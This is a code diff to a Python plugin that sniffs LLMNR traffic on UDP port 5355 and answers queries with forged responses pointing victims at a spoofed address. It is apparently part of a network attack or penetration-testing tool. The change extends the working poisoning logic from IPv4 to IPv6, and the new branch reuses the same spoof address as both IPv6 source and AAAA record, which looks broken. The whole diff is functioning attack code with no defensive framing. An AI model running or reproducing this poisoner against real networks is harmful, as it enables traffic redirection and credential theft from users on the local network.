@@ -36,7 +36,7 @@ class LLMNRPlugin(ProtocolPlugin):
         loop = asyncio.get_event_loop()
         await loop.run_in_executor(None, self._sniff_blocking, stop_filter)
 
-    def _sniff_blocking(self, stop_filter: Any):
+    def _sniff_blocking(self, stop_filter: Any) -> None:
         sniff(
             iface=self.interface, 
             filter="udp port 5355", 
@@ -45,16 +45,32 @@ class LLMNRPlugin(ProtocolPlugin):
             stop_filter=stop_filter
         )
 
-    def _handle_packet(self, packet: Packet):
+    def _handle_packet(self, packet: Packet) -> None:
         if DNS in packet and packet[DNS].qr == 0:
-            query_name = packet[DNSQR].qname.decode().rstrip('.')
-            logger.info(f"[LLMNR] Intercepted query for {query_name} from {packet[IP].src}")
-            
-            resp = IP(dst=packet[IP].src, src=self.spoof_ip) / \
-                   UDP(dport=packet[UDP].sport, sport=5355) / \
-                   DNS(id=packet[DNS].id, qr=1, aa=1, rcode=0,
-                       qd=packet[DNS].qd,
-                       an=DNSRR(rrname=packet[DNSQR].qname, type='A', rdata=self.spoof_ip))
-            
-            send(resp, iface=self.interface, verbose=False)
-            logger.info(f"[LLMNR] Spoofed response sent to {packet[IP].src}")
+            if DNSQR in packet:
+                query_name = packet[DNSQR].qname.decode(errors='ignore').rstrip('.')
+                source_ip = packet[IP].src if IP in packet else (packet[IPv6].src if IPv6 in packet else "Unknown")
+                
+                logger.info(f"[LLMNR] Intercepted query for {query_name} from {source_ip}")
+                
+                # Basic response crafting (IPv4)
+                if IP in packet:
+                    resp = IP(dst=packet[IP].src, src=self.spoof_ip) / \
+                           UDP(dport=packet[UDP].sport, sport=5355) / \
+                           DNS(id=packet[DNS].id, qr=1, aa=1, rcode=0,
+                               qd=packet[DNS].qd,
+                               an=DNSRR(rrname=packet[DNSQR].qname, type='A', rdata=self.spoof_ip))
+                    send(resp, iface=self.interface, verbose=False)
+                    logger.info(f"[LLMNR] Spoofed IPv4 response sent to {packet[IP].src}")
+                
+                # IPv6 response crafting
+                elif IPv6 in packet:
+                    logger.info(f"[LLMNR] Crafting IPv6 response for {query_name}")
+                    # Standard LLMNR IPv6 response
+                    resp = IPv6(dst=packet[IPv6].src, src=self.spoof_ip) / \
+                           UDP(dport=packet[UDP].sport, sport=5355) / \
+                           DNS(id=packet[DNS].id, qr=1, aa=1, rcode=0,
+                               qd=packet[DNS].qd,
+                               an=DNSRR(rrname=packet[DNSQR].qname, type='AAAA', rdata=self.spoof_ip))
+                    send(resp, iface=self.interface, verbose=False)
+                    logger.info(f"[LLMNR] Spoofed IPv6 response sent to {packet[IPv6].src}")
